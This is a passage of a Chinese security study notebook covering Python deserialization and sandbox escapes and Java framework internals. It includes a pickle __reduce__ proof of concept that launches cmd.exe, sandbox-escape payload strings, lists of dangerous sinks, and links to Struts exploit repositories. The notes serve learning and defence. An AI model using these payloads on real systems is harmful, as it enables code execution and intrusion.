role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">import</span> <span class="cm-variable">pickle</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">import</span> <span class="cm-variable">pickletools</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">import</span> <span class="cm-variable">subprocess</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">class</span> <span class="cm-def">A</span>(<span class="cm-builtin">object</span>):</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">a</span>=<span class="cm-number">1</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">b</span>=<span class="cm-number">2</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">def</span> <span class="cm-def">__reduce__</span>(<span class="cm-variable-2">self</span>):</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">return</span>(<span class="cm-variable">subprocess</span>.<span class="cm-property">Popen</span>,((<span class="cm-string">'cmd.exe'</span>,),))</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">10</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">11</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">data</span>=<span class="cm-variable">pickle</span>.<span class="cm-property">dumps</span>(<span class="cm-variable">A</span>())</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">12</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">pickletools</span>.<span class="cm-property">dis</span>(<span class="cm-variable">data</span>)</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 272px;"></div><div class="CodeMirror-gutters" style="height: 272px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 35px;"></div></div></div></div></pre><h4 id='其他序列化库'><span>其他序列化库</span></h4><ul><li><span>PyYAML</span></li><li><span>marshal</span></li><li><span>shelve</span></li></ul><h3 id='沙箱-1'><span>沙箱</span></h3><h4 id='常用函数-2'><span>常用函数</span></h4><ul><li><span>eval / exec / compile</span></li><li><span>dir / type</span></li><li><span>globals / locals / vars</span></li><li><span>getattr / setattr</span></li></ul><h4 id='导入包方式'><span>导入包方式</span></h4><ul><li><span>import os</span></li><li><span>from os import </span><span>*</span></li><li><span>_</span><span>_</span><span>import__ (</span><span>&quot;</span><span>os</span><span>&quot;</span><span>)</span></li><li><span>importlib</span></li><li><span>imp</span></li><li><span>reload(os)</span></li><li><span>execfile 仅 Python2 支持</span></li></ul><h4 id='绕过-2'><span>绕过</span></h4><ul><li><p><span>dir( _</span><span>_</span><span>builtins__ ) 查看内置模块</span></p></li><li><p><span>最简单的思路是在已有的模块中 import，如果那个模块中已经 import 可以利用的模块就可以使用了</span></p></li><li><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>2</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">在父类中寻找可用的模块，最常见 payload 是 (). __class__ . __bases__[0]. __subclasses__() </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">或者用魔术方法获取全局作用域 __init__ . __func__ . __globals__</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="height: 45px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre></li><li><p><span>有些网站没有过滤 pickle 模块，可以使用 pickle 实现任意代码执行，生成 payload 可以使用 </span><a href='https://gist.github.com/freddyb/3360650' target='_blank' class='url'>https://gist.github.com/freddyb/3360650</a></p></li><li><p><span>有的沙箱把相关的模块代码都被删除了，则可以使用 libc 中的函数，Python 中调用一般可以使用ctypes 或者 cffi。</span></p></li><li><p><span>&quot;</span><span>A</span><span>&quot;</span><span>&quot;</span><span>B</span><span>&quot;</span><span> == </span><span>&quot;</span><span>AB</span><span>&quot;</span></p></li></ul><h4 id='防御-2'><span>防御</span></h4><p><span>Python 官方给出了一些防御的建议</span></p><ul><li><span>使用 Jython 并尝试使用 Java 平台来锁定程序的权限</span></li><li><span>使用 fakeroot 来避免</span></li><li><span>使用一些 rootjail 的技术</span></li></ul><h3 id='框架-1'><span>框架</span></h3><h4 id='django-2'><span>Django</span></h4><h5 id='历史漏洞'><span>历史漏洞</span></h5><ul><li><a href='https://paper.seebug.org/58/'><span>CVE-2016-7401 CSRF Bypass</span></a></li><li><a href='https://www.djangoproject.com/weblog/2017/apr/04/security-releases/'><span>CVE-2017-7233/7234 Open redirect vulnerability</span></a></li><li><a href='https://www.leavesongs.com/PENETRATION/django-debug-page-xss.html'><span>CVE-2017-12794 debug page XSS</span></a></li></ul><h5 id='配置相关'><span>配置相关</span></h5><ul><li><span>Nginx 在为 Django 做反向代理时，静态文件目录配置错误会导致源码泄露。访问 /static.. 会 301 重定向到 /static../</span></li></ul><h4 id='flask'><span>Flask</span></h4><p><span>Flask 默认使用客户端 session，使得 session 可以被伪造</span></p><h3 id='代码混淆-2'><span>代码混淆</span></h3><h4 id='常见混淆方式'><span>常见混淆方式</span></h4><ul><li><span>基于 AST 变换</span></li><li><span>编译为 pyc 文件</span></li><li><span>Pyinstaller</span></li><li><span>PyArmor</span></li><li><span>通过 AES 加密为 pye 文件</span></li></ul><h3 id='sink-2'><span>Sink</span></h3><h4 id='命令执行-2'><span>命令执行</span></h4><ul><li><span>asyncio.new_event_loop().subprocess_exec</span></li><li><span>asyncio.subprocess</span></li><li><span>bdb.os</span></li><li><span>cgi.os.system</span></li><li><span>cgi.sys</span></li><li><span>code.InteractiveInterpreter</span></li><li><span>commands</span></li><li><span>ctypes.CDLL</span></li><li><span>eval</span></li><li><span>exec</span></li><li><span>execfile</span></li><li><span>input // python2 only</span></li><li><span>os.exec</span></li><li><span>os.exec</span><span>*</span></li><li><span>os.fork</span></li><li><span>os.popen</span></li><li><span>os.spawn</span></li><li><span>os.system</span></li><li><span>platform.os</span></li><li><span>platform.popen</span></li><li><span>platform.sys</span></li><li><span>popen2</span></li><li><span>pty.os</span></li><li><span>pty.spawn</span></li><li><span>subprocess</span></li><li><span>timeit.sys</span></li><li><span>timeit.timeit</span></li><li><span>typing.get_type_hints() + _</span><span>_</span><span>annotations__</span></li><li><span>.</span><span>..</span></li></ul><h4 id='文件读取-3'><span>文件读取</span></h4><ul><li><p><span>open</span></p></li><li><p><span>os.open</span></p></li><li><p><span>urllib.request.urlopen(</span>‘<span>file:///</span>’<span>)</span></p></li><li><p><span>codecs.open</span></p></li><li><p><span>fileinput</span></p></li><li><h6 id='仅-python2'><span>仅 Python2</span></h6><ul><li><span>types.FileType</span></li></ul></li></ul><h4 id='危险第三方库'><span>危险第三方库</span></h4><ul><li><span>Template</span></li><li><span>subprocess32</span></li></ul><h4 id='反序列化-3'><span>反序列化</span></h4><ul><li><span>marshal</span></li><li><span>PyYAML</span></li><li><span>pickle</span></li><li><span>cPickle</span></li><li><span>shelve</span></li><li><span>PIL</span></li></ul><h3 id='参考链接-5'><span>参考链接</span></h3><h4 id='反序列化-4'><span>反序列化</span></h4><ul><li><a href='http://www.91ri.org/9576.html'><span>Python pickle 反序列化</span></a></li><li><a href='https://wiki.python.org/moin/SandboxedPython'><span>Python 沙箱官方 wiki</span></a></li><li><a href='http://xxlegend.com/2015/07/31/Python%20evalçš„å¸¸è§é”™è¯¯å°è£…åŠåˆ©ç”¨åŽŸç†/'><span>Python eval 的常见错误封装及利用原理</span></a></li><li><a href='https://docs.python.org/zh-cn/3/library/pickle.html'><span>pickle Python 对象序列化</span></a></li><li><a href='https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf'><span>Sour Pickles A serialised exploitation guide in one part</span></a></li><li><a href='https://rushter.com/blog/pickle-serialization-internals/'><span>How pickle works in Python</span></a></li></ul><h4 id='沙箱-2'><span>沙箱</span></h4><ul><li><a href='https://www.anquanke.com/post/id/86366'><span>Python 沙箱通用绕过</span></a></li><li><a href='https://www.freebuf.com/articles/system/203208.html'><span>一文看懂 Python 沙箱逃逸</span></a></li></ul><h4 id='格式化字符串-2'><span>格式化字符串</span></h4><ul><li><a href='https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html'><span>Python 字符串格式化漏洞</span></a></li><li><a href='http://lucumr.pocoo.org/2016/12/29/careful-with-str-format/'><span>Be Careful with Python</span>’<span>s New-Style String Format</span></a></li></ul><h4 id='综合-1'><span>综合</span></h4><ul><li><a href='https://github.com/vstinner/python-security.git'><span>python security</span></a></li><li><a href='https://github.com/bit4woo/python_sec'><span>Python 安全和代码审计相关资料收集</span></a></li></ul><h2 id='53-java'><span>5.3 Java</span></h2><h3 id='基本概念-1'><span>基本概念</span></h3><h4 id='jvm'><span>JVM</span></h4><blockquote><p><span>JVM 是 Java 平台的核心，以机器代码来实现，为程序执行提供了所需的所有基本功能，例如字节码解析器、JIT 编译器、垃圾收集器等。由于它是机器代码实现的，其同样受到二进制文件受到的攻击。</span></p><p><span>JCL 是 JVM 自带的一个标准库，含有数百个系统类。默认情况下，所有系统类都是可信任的， 拥有所有的特权。</span></p></blockquote><h4 id='jdk-1'><span>JDK</span></h4><blockquote><p><span>Java 开发工具包 (Java Development Kit，JDK) 是 Oracle 公司发布的 Java 平台，有标准版 (Standard Edition，Java SE)、企业版 (Enterprise Edition，Java EE) 等版本。</span></p><p><span>在最开始，JDK 以二进制形式发布，而后在 2006 年 11 月 17 日，Sun 以 GPL 许可证发布了 Java 的源代码，于是之后出现了 OpenJDK。</span></p></blockquote><h4 id='jmx'><span>JMX</span></h4><blockquote><p><span>JMX(Java Management Extensions，Java 管理扩展) 是一个为应用程序植入管理功能的框架，主要为管理和监视应用程序、系统对象、设备和面向服务的网络提供相应的工具。JMX 可以远程读取系统中的值、调用系统中的方法。在 JMX 未配置身份验证或 JDK 版本过低存在反序列化漏洞时，可能会导致远程代码执行。</span></p></blockquote><h4 id='jni'><span>JNI</span></h4><blockquote><p><span>JNI (Java Native Interface) 是 Java 提供的和其他语言交互的接口。</span></p></blockquote><h4 id='jna'><span>JNA</span></h4><blockquote><p><span>JNA (Java Native Access) 是在 JNI 上的框架，用于自动实现 Java 接口到 native function 的映射，而不需要另外编写 JNI 代码。</span></p></blockquote><h4 id='ognl'><span>OGNL</span></h4><blockquote><p><span>OGNL(Object-Graph Navigation Language，对象导航语言) 是一种功能强大的表达式语言，通过简单一致的表达式语法，提供了存取对象的任意属性、调用对象的方法、遍历整个对象的结构图、实现字段类型转化等功能。</span></p><p><span>Struts2 中使用了 OGNL，提供了一个 ValueStack 类。ValueStack 分为 root 和 context 两部分。root 中是当前的 action 对象，context 中是 ActionContext 里面所有的内容。</span></p></blockquote><h4 id='io-模型'><span>IO 模型</span></h4><blockquote><p><span>Java 对操作系统的各种 IO 模型进行了封装，形成了不同的 API。</span></p></blockquote><h4 id='bio'><span>BIO</span></h4><blockquote><p><span>BIO (Blocking I/O) 是同步阻塞 I/O 模式，数据的读取写入必须阻塞在一个线程内等待其完成。</span></p></blockquote><h4 id='nio'><span>NIO</span></h4><blockquote><p><span>NIO (New I/O) 是一种同步非阻塞的 I/O 模型，在 Java 1.4 中引入，对应 java.nio 包，提供了 Channel , Selector，Buffer 等抽象。</span></p></blockquote><h4 id='aio'><span>AIO</span></h4><blockquote><p><span>AIO (Asynchronous I/O) 在 Java 7 中引入，是 NIO 的改进版，是异步非阻塞的 IO 模型，基于事件和回调机制实现。</span></p></blockquote><h4 id='反射-2'><span>反射</span></h4><h5 id='简介-16'><span>简介</span></h5><blockquote><p><span>Java 反射机制是指在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意方法和属性；这种动态获取信息以及动态调用对象方法的功能被称为语言的反射机制。</span></p></blockquote><h5 id='相关类'><span>相关类</span></h5><figure><table><thead><tr><th><span>类名</span></th><th><span>用途</span></th></tr></thead><tbody><tr><td><span>Class</span></td><td><span>类的实体</span></td></tr><tr><td><span>Field</span></td><td><span>类的成员变量</span></td></tr><tr><td><span>Method</span></td><td><span>类的方法</span></td></tr><tr><td><span>Constructor</span></td><td><span>类的构造方法</span></td></tr></tbody></table></figure><h5 id='class-相关'><span>Class 相关</span></h5><ul><li><p><strong><span>asSubclass(Class</span><span>&lt;</span><span>U</span><span>&gt;</span><span> clazz)</span></strong></p><ul><li><span>把传递的类的对象转换成代表其子类的对象</span></li></ul></li><li><h4 id='cast'><span>Cast</span></h4><ul><li><span>把对象转换成代表类或是接口的对象</span></li></ul></li><li><h4 id='getclassloader'><span>getClassLoader()</span></h4><ul><li><span>获得类的加载器</span></li></ul></li><li><h4 id='getclasses'><span>getClasses()</span></h4><ul><li><span>返回一个数组，数组中包含该类中所有公共类和接口类的对象</span></li></ul></li><li><h4 id='getdeclaredclasses'><span>getDeclaredClasses()</span></h4><ul><li><span>返回一个数组，数组中包含该类中所有类和接口类的对象</span></li></ul></li><li><h4 id='fornamestring-classname'><span>forName(String className)</span></h4><ul><li><span>根据类名返回类的对象</span></li></ul></li><li><h4 id='getname'><span>getName()</span></h4><ul><li><span>获得类的完整路径名字</span></li></ul></li><li><h4 id='newinstance'><span>newInstance()</span></h4><ul><li><span>创建类的实例</span></li></ul></li><li><h4 id='getpackage'><span>getPackage()</span></h4><ul><li><span>获得类的包</span></li></ul></li><li><h4 id='getsimplename'><span>getSimpleName()</span></h4><ul><li><span>获得类的名字</span></li></ul></li><li><h4 id='getsuperclass'><span>getSuperclass()</span></h4><ul><li><span>获得当前类继承的父类的名字</span></li></ul></li><li><h4 id='getinterfaces'><span>getInterfaces()</span></h4><ul><li><span>获得当前类实现的类或是接口</span></li></ul></li><li><h4 id='getfieldstring-name'><span>getField(String name)</span></h4><ul><li><span>获得某个公有的属性对象</span></li></ul></li><li><h4 id='getfields'><span>getFields()</span></h4><ul><li><span>获得所有公有的属性对象</span></li></ul></li><li><h4 id='getdeclaredfieldstring-name'><span>getDeclaredField(String name)</span></h4><ul><li><span>获得某个属性对象</span></li></ul></li><li><h4 id='getdeclaredfields'><span>getDeclaredFields()</span></h4><ul><li><span>获得所有属性对象</span></li></ul></li><li><h4 id='getannotationclassa-annotationclass'><span>getAnnotation(Class</span><span>&lt;</span><span>A</span><span>&gt;</span><span> annotationClass)</span></h4><ul><li><span>返回该类中与参数类型匹配的公有注解对象</span></li></ul></li><li><h4 id='getannotations'><span>getAnnotations()</span></h4><ul><li><span>返回该类所有的公有注解对象</span></li></ul></li><li><h4 id='getdeclaredannotationclassa-annotationclass'><span>getDeclaredAnnotation(Class</span><span>&lt;</span><span>A</span><span>&gt;</span><span> annotationClass)</span></h4><ul><li><span>返回该类中与参数类型匹配的所有注解对象</span></li></ul></li><li><h4 id='getdeclaredannotations'><span>getDeclaredAnnotations()</span></h4><ul><li><span>返回该类所有的注解对象</span></li></ul></li><li><h4 id='getconstructorclass-parametertypes'><span>getConstructor(Class</span><span>.</span><span>..</span><span>&lt;</span><span>?</span><span>&gt;</span><span> parameterTypes)</span></h4><ul><li><span>获得该类中与参数类型匹配的公有构造方法</span></li></ul></li><li><h4 id='getconstructors'><span>getConstructors()</span></h4><ul><li><span>获得该类的所有公有构造方法</span></li></ul></li><li><h4 id='getdeclaredconstructorclass-parametertypes'><span>getDeclaredConstructor(Class</span><span>.</span><span>..</span><span>&lt;</span><span>?</span><span>&gt;</span><span> parameterTypes)</span></h4><ul><li><span>获得该类中与参数类型匹配的构造方法</span></li></ul></li><li><h4 id='getdeclaredconstructors'><span>getDeclaredConstructors()</span></h4><ul><li><span>获得该类所有构造方法</span></li></ul></li><li><h4 id='getmethodstring-name-class-parametertypes'><span>getMethod(String name, Class</span><span>.</span><span>..</span><span>&lt;</span><span>?</span><span>&gt;</span><span> parameterTypes)</span></h4><ul><li><span>获得该类某个公有的方法</span></li></ul></li><li><h4 id='getmethods'><span>getMethods()</span></h4><ul><li><span>获得该类所有公有的方法</span></li></ul></li><li><h4 id='getdeclaredmethodstring-name-class-parametertypes'><span>getDeclaredMethod(String name, Class</span><span>.</span><span>..</span><span>&lt;</span><span>?</span><span>&gt;</span><span> parameterTypes)</span></h4><ul><li><span>获得该类某个方法</span></li></ul></li><li><h4 id='getdeclaredmethods'><span>getDeclaredMethods()</span></h4><ul><li><span>获得该类所有方法</span></li></ul></li><li><h4 id='isannotation'><span>isAnnotation()</span></h4><ul><li><span>如果是注解类型则返回 true</span></li></ul></li><li><h4 id='isannotationpresentclass-extends-annotation-annotationclass'><span>isAnnotationPresent(Class</span><span>&lt;</span><span>? extends Annotation</span><span>&gt;</span><span> annotationClass)</span></h4><ul><li><span>如果是指定类型注解类型则返回 true</span></li></ul></li><li><h4 id='isanonymousclass'><span>isAnonymousClass()</span></h4><ul><li><span>如果是匿名类则返回 true</span></li></ul></li><li><h4 id='isarray'><span>isArray()</span></h4><ul><li><span>如果是一个数组类则返回 true</span></li></ul></li><li><h4 id='isenum'><span>isEnum()</span></h4><ul><li><span>如果是枚举类则返回 true</span></li></ul></li><li><h4 id='isinstanceobject-obj'><span>isInstance(Object obj)</span></h4><ul><li><span>如果 obj 是该类的实例则返回 true</span></li></ul></li><li><h4 id='isinterface'><span>isInterface()</span></h4><ul><li><span>如果是接口类则返回 true</span></li></ul></li><li><h4 id='islocalclass'><span>isLocalClass()</span></h4><ul><li><span>如果是局部类则返回 true</span></li></ul></li><li><h4 id='ismemberclass'><span>isMemberClass()</span></h4><ul><li><span>如果是内部类则返回 true</span></li></ul></li></ul><h4 id='field-相关'><span>Field 相关</span></h4><ul><li><p><strong><span>equals(Object obj)</span></strong></p><ul><li><span>属性与 obj 相等则返回 true</span></li></ul></li><li><h4 id='getobject-obj'><span>get(Object obj)</span></h4><ul><li><span>获得 obj 中对应的属性值</span></li></ul></li><li><h4 id='setobject-obj-object-value'><span>set(Object obj, Object value)</span></h4><ul><li><span>设置 obj 中对应属性值</span></li></ul></li></ul><h4 id='method-相关'><span>Method 相关</span></h4><ul><li><p><strong><span>invoke(Object obj, Object</span><span>.</span><span>.. args)</span></strong></p><ul><li><span>传递 object 对象及参数调用该对象对应的方法</span></li></ul></li></ul><h4 id='constructor'><span>Constructor</span></h4><ul><li><p><strong><span>newInstance(Object</span><span>.</span><span>.. initargs)</span></strong></p><ul><li><span>根据传递的参数创建类的对象</span></li></ul></li></ul><h3 id='类'><span>类</span></h3><h4 id='生命周期'><span>生命周期</span></h4><p><span>整体来说，Java 中类的生命周期如下：加载 (Loading) -</span><span>&gt;</span><span> </span><span>[</span><span> 连接 (Linking) : 验证 (Verification) -</span><span>&gt;</span><span> 准备(Perparation) -</span><span>&gt;</span><span> 解析 (Resolutin) </span><span>]</span><span> -</span><span>&gt;</span><span> 初始化 (Initialization) -</span><span>&gt;</span><span> 使用 (Using) -</span><span>&gt;</span><span> 卸载 (Unloading) 。加载过程分为三步：</span></p><ul><li><span>通过全限定类名来获取定义此类的二进制字节流</span></li><li><span>将字节流所代表的静态存储结构转化为方法区的运行时数据结构</span></li><li><span>在内存中生成代表这个类的 java.lang.Class 对象，作为方法区这个类的各种数据的访问入口</span></li></ul><p><span>验证阶段主要用于确保 Class 文件的字节流符合当前虚拟机的要求，分为几步：</span></p><ul><li><span>判断文件格式：是否以 0xCAFEBABE 开始，主次版本号是否在处理范围内</span></li><li><span>元数据验证</span></li><li><span>字节码验证</span></li><li><span>符号引用验证</span></li></ul><h3 id='部分运行选项与说明'><span>部分运行选项与说明</span></h3><ul><li><span>-Xverify:none 关闭类加载时的验证措施</span></li></ul><h3 id='框架-2'><span>框架</span></h3><h4 id='servlet'><span>Servlet</span></h4><h5 id='简介-17'><span>简介</span></h5><blockquote><p><span>Servlet(Server Applet) 是 Java Servlet 的简称，称为小服务程序或服务连接器，是用 Java 编写的服务器端程序，主要功能在于交互式地浏览和修改数据，生成动态 Web 内容。</span></p><p><span>狭义的 Servlet 是指 Java 语言实现的一个接口，广义的 Servlet 是指任何实现了这个 Servlet 接口的类，一般情况下，人们将 Servlet 理解为后者。Servlet 运行于支持 Java 的应用服务器中。从原理上讲，Servlet 可以响应任何类型的请求，但绝大多数情况下 Servlet 只用来扩展基于 HTTP 协议的 Web 服务器。</span></p></blockquote><h5 id='生命周期为'><span>生命周期为</span></h5><ul><li><span>客户端请求该 Servlet</span></li><li><span>加载 Servlet 类到内存</span></li><li><span>实例化并调用 init() 方法初始化该 Servlet</span></li><li><span>service()(根据请求方法不同调用 doGet() / doPost() / </span><span>.</span><span>.. / destroy()</span></li></ul><h5 id='接口'><span>接口</span></h5><blockquote><p><span>init()</span></p><p><span>在 Servlet 的生命期中，仅执行一次 init() 方法，在服务器装入 Servlet 时执行。</span></p><p><span>service()</span></p><p><span>service() 方法是 Servlet 的核心。每当一个客户请求一个 HttpServlet 对象，该对象的 service() 方法就要被调用，而 传递给这个方法一个</span>”<span> 请求</span>“<span>(ServletRequest) 对象和一个</span>”<span> 响应</span>“<span>(ServletResponse) 对象作为参数。</span></p></blockquote><h4 id='struts-2'><span>Struts 2</span></h4><h5 id='简介-18'><span>简介</span></h5><blockquote><p><span>Struts2 是一个基于 MVC 设计模式的 Web 应用框架，它本质上相当于一个 servlet，在 MVC 设计模式中，</span></p><p><span>Struts2 作为控制器 (Controller) 来建立模型与视图的数据交互。</span></p></blockquote><h5 id='请求流程-1'><span>请求流程</span></h5><ul><li><span>客户端发送请求的 tomcat 服务器</span></li><li><span>请求经过一系列过滤器</span></li><li><span>FilterDispatcher 调用 ActionMapper 来决定这个请求是否要调用某个 Action</span></li><li><span>ActionMppaer 决定调用某个 ActionFilterDispatcher 把请求给 ActionProxy</span></li><li><span>ActionProxy 通过 Configuration Manager 查看 structs.xml，找到对应的 Action 类</span></li><li><span>ActionProxy 创建一个 ActionInvocation 对象</span></li><li><span>ActionInvocation 对象回调 Action 的 execute 方法</span></li><li><span>Action 执行完毕后，ActionInvocation 根据返回的字符串，找到相应的 result，通过 HttpServletResponse 返回给服务器</span></li></ul><h5 id='相关-cve-4'><span>相关 CVE</span></h5><ul><li><span>CVE-2016-3081 (S2-032)</span></li><li><span>CVE-2016-3687 (S2-033)</span></li><li><span>CVE-2016-4438 (S2-037)</span></li><li><a href='https://github.com/immunio/apache-struts2-CVE-2017-5638'><span>CVE-2017-5638</span></a></li><li><span>CVE-2017-7672</span></li><li><span>CVE-2017-9787</span></li><li><span>CVE-2017-9793</span></li><li><span>CVE-2017-9804</span></li><li><a href='https://github.com/mazen160/struts-pwn_CVE-2017-9805'><span>CVE-2017-9805</span></a></li><li><a href='https://github.com/brianwrf/S2-053-CVE-2017-12611'><span>CVE-2017-12611</span></a></li><li><span>CVE-2017-15707</span></li><li><span>CVE-2018-1327</span></li><li><span>CVE-2018-11776</span></li></ul><h4 id='spring'><span>Spring</span></h4><h5 id='简介-19'><span>简介</span></h5><blockquote><p><span>Spring 一般指的是 Spring Framework，一个轻量级 Java 应用程序开源框架，提供了简易的开发方式。</span></p></blockquote><h5 id='spring-mvc'><span>Spring MVC</span></h5><blockquote><p><span>Spring MVC 根据 Spring 的模式设计的 MVC 框架，主要用于开发 Web 应用，简化开发。</span></p></blockquote><h5 id='spring-boot'><span>Spring Boot</span></h5><blockquote><p><span>Spring 在推出之初方案较为繁琐，因此提供了 Spring Boot 作为自动化配置工具，降低项目搭建的复杂度。</span></p></blockquote><h5 id='请求流程-2'><span>请求流程</span></h5><ul><li><span>用户发送请求给服务器</span></li><li><span>服务器收到请求，使用 DispatchServlet 处理</span></li><li><span>Dispatch 使用 HandleMapping 检查 url 是否有对应的 Controller，如果有，执行</span></li><li><span>如果 Controller 返回字符串，ViewResolver 将字符串转换成相应的视图对象</span></li><li><span>DispatchServlet 将视图对象中的数据，输出给服务器</span></li><li><span>服务器将数据输出给客户端</span></li></ul><h5 id='cve-概览-1'><span>CVE 概览</span></h5><ul><li><p><strong><span>CVE-2018-1270</span></strong></p><ul><li><span>Spring Websocket 远程代码执行漏洞</span></li><li><span>Spring Framework 5.0 - 5.0.5</span></li><li><span>Spring Framework 4.3 - 4.3.15</span></li></ul></li><li><h4 id='cve-2018-1273'><span>CVE-2018-1273</span></h4><ul><li><span>Spring Data 远程代码执行漏洞</span></li><li><span>Spring Data Commons 1.13 - 1.13.10</span></li><li><span>Spring Data Commons 2.0 - 2.0.5</span></li><li><span>Spring Data REST 2.6 - 2.6.10</span></li><li><span>Spring Data REST 3.0 - 3.0.5</span></li></ul></li><li><h4 id='cve-2017-8046'><span>CVE-2017-8046</span></h4><ul><li><span>Spring Data REST 远程代码执行漏洞</span></li></ul></li><li><h4 id='cve-2017-4971'><span>CVE-2017-4971</span></h4><ul><li><span>Spring Web Flow 远程代码执行漏洞</span></li></ul></li></ul><h4 id='shiro'><span>Shiro</span></h4><h5 id='简介-20'><span>简介</span></h5><blockquote><p><span>Apache Shiro 是一个功能强大 易于使用的 Java 安全框架，功能包括身份验证，授权，加密和会话管理。</span></p></blockquote><h5 id='cve-概览-2'><span>CVE 概览</span></h5><ul><li><p><strong><span>CVE-2020-13933</span></strong></p><ul><li><span>Apache Shiro </span><span>&lt;</span><span> 1.6.0</span></li><li><span>身份验证绕过漏洞</span></li></ul></li><li><p><strong><span>CVE-2020-11989</span></strong></p><ul><li><span>SHIRO-782</span></li><li><span>Apache Shiro </span><span>&lt;</span><span> 